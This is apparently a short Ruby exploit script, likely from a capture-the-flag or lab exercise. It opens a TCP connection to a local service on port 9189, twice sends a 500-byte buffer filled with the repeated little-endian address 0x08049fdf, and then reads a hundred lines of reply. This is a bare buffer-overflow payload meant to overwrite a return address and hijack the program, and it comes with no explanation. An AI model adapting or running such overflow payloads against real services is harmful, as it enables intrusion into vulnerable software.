require 'socket'
s = TCPSocket.new('localhost', 9189)


s.puts [0x08049fdf].pack("V") * (500/4)
sleep(1)
s.puts [0x08049fdf].pack("V") * (500/4)


100.times{|i|
          puts i
puts s.gets
        }

